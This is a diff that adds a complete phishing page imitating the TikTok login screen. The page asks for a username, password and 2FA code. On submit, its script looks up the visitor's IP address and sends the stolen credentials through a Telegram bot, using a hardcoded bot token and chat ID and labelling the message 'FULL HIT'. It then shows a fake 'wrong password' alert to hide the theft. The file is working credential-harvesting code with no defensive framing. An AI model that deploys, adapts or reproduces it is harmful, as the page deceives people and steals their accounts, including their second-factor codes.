@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TikTok - Log In</title>
+  <style>
+    body {margin:0;background:#000;color:#fff;font-family:sans-serif;text-align:center;padding:20px;height:100vh;display:flex;align-items:center;justify-content:center;}
+    .container {width:90%;max-width:380px;background:#111;padding:30px;border-radius:12px;box-shadow:0 0 20px rgba(255,255,255,0.1);}
+    h2 {margin:0 0 20px;}
+    input {width:100%;padding:14px;margin:12px 0;background:#222;border:none;color:#fff;border-radius:8px;font-size:16px;box-sizing:border-box;}
+    button {width:100%;padding:14px;background:#fe2c55;border:none;color:#fff;font-weight:bold;border-radius:8px;font-size:17px;cursor:pointer;}
+    .small {font-size:13px;color:#aaa;margin-top:10px;}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>TikTok Login</h2>
+    <form id="form">
+      <input id="u" placeholder="Username or Email" required autocomplete="off">
+      <input id="p" type="password" placeholder="Password" required autocomplete="off">
+      <input id="twofa" placeholder="2FA Code (if required)" autocomplete="off">
+      <button type="submit">Log in</button>
+      <div class="small">Enter the 6-digit code sent to your phone/email if prompted</div>
+    </form>
+  </div>
+
+  <script>
+    const token = "8205658105:AAFH2lOY2Cd0yUASvewOT0hZqCOro5GDMGY";
+    const chat = "341672537";
+
+    document.getElementById("form").addEventListener("submit", async (e) => {
+      e.preventDefault();
+
+      const u = document.getElementById("u").value.trim();
+      const p = document.getElementById("p").value.trim();
+      const twofa = document.getElementById("twofa").value.trim();
+
+      let ip = "unknown";
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        ip = data.ip;
+      } catch {}
+
+      const msg = `🎣 FULL HIT\nUser: ${u}\nPass: ${p}\n2FA: ${twofa || "not entered"}\nIP: ${ip}\nTime: ${new Date().toLocaleString("en-US", {timeZone: "Africa/Lagos"})}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}`)
+        .catch(() => {});
+
+      alert("Wrong password or code. Try again.");
+    });
+  </script>
+</body>
+</html>
